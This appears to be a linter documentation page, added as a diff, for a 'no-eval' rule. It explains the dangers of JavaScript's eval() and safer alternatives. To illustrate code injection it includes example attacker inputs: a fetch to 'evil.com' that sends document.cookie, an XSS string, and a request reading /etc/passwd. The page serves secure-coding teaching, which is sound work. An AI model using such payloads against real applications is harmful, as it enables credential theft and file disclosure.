@@ -1,0 +1,304 @@
+---
+title: no-eval
+description: Disallow the use of eval()
+---
+
+# no-eval
+
+JavaScript's `eval()` function is potentially dangerous and often misused. It can open programs to injection attacks and is slow.
+
+<Note>
+**Rule Type:** Suggestion  
+**Fixable:** No
+</Note>
+
+## Why This Rule Exists
+
+- **Security**: `eval()` on untrusted input can execute malicious code
+- **Performance**: Code in `eval()` can't be optimized
+- **Debugging**: Harder to debug code in `eval()`
+- **Better alternatives**: Almost always unnecessary
+
+## Rule Details
+
+This rule warns whenever `eval()` is used.
+
+## Examples
+
+### Incorrect Code
+
+```js
+const obj = { x: "foo" };
+const key = "x";
+const value = eval("obj." + key);
+
+(0, eval)("const a = 0");
+
+const foo = eval;
+foo("const a = 0");
+
+this.eval("const a = 0");
+window.eval("const a = 0");
+global.eval("const a = 0");
+```
+
+### Correct Code
+
+```js
+const obj = { x: "foo" };
+const key = "x";
+const value = obj[key];
+
+class A {
+    foo() {
+        // This is a user-defined method, not global eval
+        this.eval("const a = 0");
+    }
+    eval() {}
+}
+```
+
+## Why eval() Is Dangerous
+
+### Code Injection
+
+<Warning>
+`eval()` with user input can execute arbitrary code.
+</Warning>
+
+```js
+// DANGEROUS!
+function calculate(userInput) {
+    return eval(userInput);
+}
+
+// User types: "fetch('evil.com?data=' + document.cookie)"
+calculate(userInput); // Sends cookies to attacker!
+```
+
+### Performance
+
+```js
+// Slow: Can't be optimized
+for (let i = 0; i < 1000; i++) {
+    eval('doSomething()');
+}
+
+// Fast: Can be optimized
+for (let i = 0; i < 1000; i++) {
+    doSomething();
+}
+```
+
+## Common Use Cases and Alternatives
+
+### Dynamic Property Access
+
+```js
+// Wrong
+const value = eval("obj." + propName);
+
+// Right
+const value = obj[propName];
+```
+
+### JSON Parsing
+
+```js
+// Wrong (and dangerous!)
+const data = eval("(" + jsonString + ")");
+
+// Right
+const data = JSON.parse(jsonString);
+```
+
+### Dynamic Code Generation
+
+```js
+// Wrong
+const fn = eval("(function(x) { return x * 2; })");
+
+// Right
+const fn = new Function('x', 'return x * 2');
+// Or better: just write the function
+const fn = (x) => x * 2;
+```
+
+### Template Strings
+
+```js
+// Wrong
+const result = eval(`${a} + ${b}`);
+
+// Right
+const result = a + b;
+```
+
+### Computed Property Names
+
+```js
+// Wrong
+eval(`obj.${dynamicProp} = value`);
+
+// Right
+obj[dynamicProp] = value;
+```
+
+### Configuration Objects
+
+```js
+// Wrong - evaluating config
+const config = eval(configString);
+
+// Right - parse as JSON
+const config = JSON.parse(configString);
+
+// Or use a safe parser
+import yaml from 'js-yaml';
+const config = yaml.load(configString);
+```
+
+## Safe Alternatives
+
+### Sandboxed Evaluation
+
+If you must evaluate code, use a sandbox:
+
+```js
+import { VM } from 'vm2';
+
+const vm = new VM({
+    timeout: 1000,
+    sandbox: {
+        allowedFunction: () => 'safe'
+    }
+});
+
+const result = vm.run(untrustedCode);
+```
+
+### Expression Evaluators
+
+```js
+import { evaluate } from 'mathjs';
+
+// Safe math expression evaluation
+const result = evaluate('2 * 3 + 4'); // 10
+```
+
+### Template Engines
+
+```js
+// Instead of eval for templating
+const template = "Hello ${name}";
+const result = eval("`" + template + "`");
+
+// Use a template library
+import Handlebars from 'handlebars';
+const template = Handlebars.compile("Hello {{name}}");
+const result = template({ name: 'World' });
+```
+
+## Options
+
+### `allowIndirect`
+
+**Type:** `boolean`  
+**Default:** `false`
+
+Allow indirect calls to `eval()` (less dangerous than direct calls).
+
+```js
+{
+  "rules": {
+    "no-eval": ["error", { "allowIndirect": true }]
+  }
+}
+```
+
+**With allowIndirect: true**
+
+```js
+// Still incorrect: direct eval
+eval("const a = 0");
+
+// Now allowed: indirect eval
+(0, eval)("const a = 0");
+const foo = eval;
+foo("const a = 0");
+window.eval("const a = 0");
+```
+
+<Note>
+Indirect eval is slightly less dangerous because it runs in global scope, not local scope.
+</Note>
+
+## Security Examples
+
+### XSS Attack
+
+```js
+// Vulnerable
+function displayUserName(name) {
+    eval(`document.title = "Hello ${name}"`);
+}
+
+// Attacker provides: "; alert('XSS'); //
+// Results in: eval("document.title = \"Hello \"; alert('XSS'); //\"");
+
+// Safe
+function displayUserName(name) {
+    document.title = `Hello ${name}`;
+}
+```
+
+### Data Theft
+
+```js
+// Vulnerable
+app.get('/calculate', (req, res) => {
+    const result = eval(req.query.expression);
+    res.json({ result });
+});
+
+// Attacker requests: /calculate?expression=require('fs').readFileSync('/etc/passwd')
+
+// Safe
+import { evaluate } from 'safe-eval-library';
+app.get('/calculate', (req, res) => {
+    const result = evaluate(req.query.expression);
+    res.json({ result });
+});
+```
+
+## When Not to Use It
+
+Rarely appropriate to disable this rule. Consider it only if:
+
+1. You're building a code evaluation tool (IDE, REPL)
+2. You have strict input validation and sandboxing
+3. You're using eval in a build tool (not runtime)
+
+Even then, look for safer alternatives first.
+
+## Temporary Disable
+
+If absolutely necessary:
+
+```js
+/* eslint-disable no-eval */
+const result = eval(trustedCode);
+/* eslint-enable no-eval */
+```
+
+But add a comment explaining why it's necessary and safe.
+
+## Related Rules
+
+- [no-implied-eval](/rules/no-implied-eval)
+- [no-new-func](/rules/no-new-func)
+
+## Further Reading
+
+- [Eval is Evil](https://ericlippert.com/2003/11/01/eval-is-evil-part-one/)
+- [How Evil is eval](https://javascriptweblog.wordpress.com/2010/04/19/how-evil-is-eval/)
